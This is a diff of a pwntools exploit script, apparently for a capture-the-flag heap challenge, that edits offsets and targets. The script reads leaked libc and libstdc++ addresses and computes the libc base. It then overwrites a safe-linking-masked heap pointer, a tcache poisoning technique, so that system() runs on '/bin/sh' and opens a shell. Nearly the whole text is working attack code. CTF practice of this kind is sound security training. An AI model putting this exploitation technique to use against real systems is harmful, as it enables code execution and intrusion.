@@ -1,7 +1,8 @@
 from pwn import *
 
-#io = gdb.debug("./test")
+#io = gdb.debug("./worm")
 io = remote("localhost", 1447)
+#io = remote("challs.umdctf.io", 31818)
 
 io.recvuntil(b"leak: ")
 
@@ -9,13 +10,14 @@ libc = ELF("./libc.so.6")
 libc_leak = int(io.recvline(), 16)
 libc_base = libc_leak - libc.symbols['_IO_2_1_stdin_']
 
+io.recvuntil(b"leak: ")
+libcpp_leak = int(io.recvline(), 16)
+libcpp_offset = 14624
+
 system = libc.symbols['system']
 
-malloc_offset = 6706960
-#free_offset = 6450232
-free_offset = 6708272
-
 print(hex(libc_leak))
+print(hex(libc_base))
 
 io.sendline(b'1')
 io.sendline(b'/bin/sh')
@@ -48,11 +50,9 @@ mask = current_ptr_masked ^ val
 
 io.sendline(b'3')
 io.sendline(b'0')
-io.sendline(p64((libc_base + free_offset - 16) ^ mask) + b'/bin/sh\x00'*1)
+io.sendline(p64((libcpp_leak + libcpp_offset - 16) ^ mask) + b'/bin/sh\x00'*1)
 
 pause()
-
-print(hex(libc_base + free_offset))
 
 io.sendline(b'1')
 print(p64(libc_base+system))
